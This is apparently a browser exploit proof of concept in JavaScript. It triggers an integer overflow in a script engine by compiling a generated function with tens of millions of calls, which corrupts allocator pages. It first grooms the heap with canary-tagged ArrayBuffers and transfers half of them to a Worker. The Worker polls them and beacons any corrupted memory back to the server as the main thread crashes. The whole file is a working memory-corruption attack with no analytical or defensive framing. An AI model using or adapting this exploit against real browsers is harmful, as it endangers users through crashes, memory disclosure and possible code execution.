// p143 — Worker witness strategy
// The sweep corrupts marge bitfit pages. A Worker holds transferred
// ArrayBuffers whose backing stores are in those pages. The Worker
// thread survives briefly after main thread SIGSEGV — enough to
// beacon corrupted data to our server.
// Beacon prefix: V143W-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V143W-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  B('BOOT');

  // ============================================================
  // PHASE 1: Create the Worker FIRST
  // Worker will hold transferred ArrayBuffers and poll them
  // ============================================================

  var workerCode = function() {
    var buffers = [];
    var views = [];
    var canaries = [];
    var running = false;
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V143W-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'targets') {
        // Receive transferred ArrayBuffers
        var transferred = e.data.bufs;
        for (var i = 0; i < transferred.length; i++) {
          buffers.push(transferred[i]);
          views.push(new DataView(transferred[i]));
          canaries.push(e.data.canaries[i]);
        }
        beacon('GOT-' + buffers.length);
        self.postMessage({ ready: true });
      }
      else if (e.data.cmd === 'watch') {
        // Start polling for corruption
        running = true;
        beacon('WATCHING');

        var found = false;
        var iterations = 0;
        var maxIter = 500000; // tight loop

        while (running && iterations < maxIter) {
          for (var i = 0; i < views.length; i++) {
            try {
              var v = views[i].getUint32(0, true);
              if (v !== canaries[i]) {
                // CORRUPTION DETECTED!
                var details = 'i=' + i + ',was=' + canaries[i].toString(16) +
                              ',now=' + v.toString(16);
                // Read more bytes around the corruption
                var bytes = '';
                for (var b = 0; b < 64 && b < views[i].byteLength; b += 4) {
                  bytes += views[i].getUint32(b, true).toString(16) + ',';
                }
                beacon('CORRUPT-' + details);
                beacon('BYTES-' + bytes.substring(0, 200));

                // Check byteLength too
                if (buffers[i].byteLength !== 100096) {
                  beacon('LEN-' + i + '-' + buffers[i].byteLength);
                }

                found = true;
                break;
              }
            } catch(ex) {
              beacon('ERR-' + i + '-' + (ex.message || '').substring(0, 30));
            }
          }
          if (found) break;
          iterations++;
        }

        if (!found) {
          beacon('NOCHANGE-' + iterations);
        }
        beacon('DONE');
      }
      else if (e.data.cmd === 'stop') {
        running = false;
      }
    };

  };

  // Create Worker from blob
  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);

  // Send base URL to Worker so its XHR can use absolute paths
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // ============================================================
  // PHASE 2: Allocate targets — same size as wrapped metadata buffer
  // These go through FastMalloc → marge bitfit (same as MetadataTable)
  // ============================================================

  var TSIZE = 100096;
  var TCOUNT = 60; // 60 × 100KB = ~6MB — a few marge pages
  var targets = [];
  var canaryList = [];

  B('ALLOC-START');

  for (var t = 0; t < TCOUNT; t++) {
    var ab = new ArrayBuffer(TSIZE);
    var dv = new DataView(ab);
    var canary = (0xCA000000 | (t << 16) | (t ^ 0xBEEF)) >>> 0;
    dv.setUint32(0, canary, true);
    dv.setUint32(4, 0xFACE0000 | t, true);
    // Fill first 128 bytes with identifiable pattern
    for (var f = 8; f < 128; f += 4) {
      dv.setUint32(f, (t << 16) | f, true);
    }
    targets.push(ab);
    canaryList.push(canary);
  }

  B('ALLOC-DONE-' + TCOUNT);

  // ============================================================
  // PHASE 3: Transfer half the targets to Worker
  // Keep the other half on main thread for comparison
  // ============================================================

  var transferList = [];
  var transferCanaries = [];
  var keepTargets = [];
  var keepCanaries = [];

  for (var t = 0; t < TCOUNT; t++) {
    if (t % 2 === 0) {
      // Transfer even-indexed to Worker
      transferList.push(targets[t]);
      transferCanaries.push(canaryList[t]);
    } else {
      // Keep odd-indexed on main thread
      keepTargets.push(targets[t]);
      keepCanaries.push(canaryList[t]);
    }
  }

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      continueAfterWorkerReady();
    }
  };

  B('TRANSFER-' + transferList.length);
  worker.postMessage(
    { cmd: 'targets', bufs: transferList, canaries: transferCanaries },
    transferList // transfer ownership
  );

  function continueAfterWorkerReady() {
    // ============================================================
    // PHASE 4: Build the overflow function
    // N=38,348,816 → metadata wraps to ~100KB
    // ============================================================

    B('BUILD-START');

    var N_TARGET = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_TARGET / CHUNK);
    var REM = N_TARGET - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v143fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v143ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v143ok ? 'OK' : 'FAIL'));

      if (!window.__v143fn) { B('NO-FN'); return; }

      // ============================================================
      // PHASE 5: Tell Worker to start watching, then CALL
      // Worker polls transferred buffers in a tight loop
      // Main thread triggers overflow — sweep corrupts marge pages
      // Worker thread survives briefly after main SIGSEGV
      // ============================================================

      worker.postMessage({ cmd: 'watch' });

      // Wait for Worker to confirm it entered polling loop
      setTimeout(function() {
        B('CALLING');

        try {
          window.__v143fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        // If we survive (unlikely):
        B('SURVIVED');

        // Check main-thread targets
        var mc = 0;
        for (var k = 0; k < keepTargets.length; k++) {
          try {
            var dv = new DataView(keepTargets[k]);
            if (dv.getUint32(0, true) !== keepCanaries[k]) mc++;
          } catch(e) { mc++; }
        }
        B('MAIN-CORRUPT-' + mc);
        worker.postMessage({ cmd: 'stop' });
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
